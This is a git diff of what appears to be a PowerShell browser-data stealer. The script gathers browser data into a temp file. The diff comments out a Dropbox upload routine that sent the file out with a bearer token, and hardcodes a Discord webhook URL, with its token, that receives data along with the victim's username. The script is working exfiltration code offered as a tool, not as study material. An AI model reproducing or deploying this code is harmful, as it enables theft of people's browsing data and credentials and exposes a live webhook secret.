@@ -48,27 +48,27 @@ Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData
 
 # Upload output file to dropbox
 
-function DropBox-Upload {
+#function DropBox-Upload {
 
-[CmdletBinding()]
-param (
+#[CmdletBinding()]
+#param (
 	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
+#[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+#[Alias("f")]
+#[string]$SourceFilePath
+#) 
+#$outputFile = Split-Path $SourceFilePath -leaf
+#$TargetFilePath="/$outputFile"
+#$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+#$authorization = "Bearer " + $db
+#$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+#$headers.Add("Authorization", $authorization)
+#$headers.Add("Dropbox-API-Arg", $arg)
+#$headers.Add("Content-Type", 'application/octet-stream')
+#Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+#}
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
+#if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -82,7 +82,7 @@ param (
     [string]$text 
 )
 
-$hookurl = "$dc"
+$hookurl = "https://discord.com/api/webhooks/1240704190439882813/RjadPztHxqnVNvbfZhjRRbENUbeJ1NewHcLaCVfCZ0WEJHQX0BSks6rv4Z1qNZ6qG2z4"
 
 $Body = @{
   'username' = $env:username
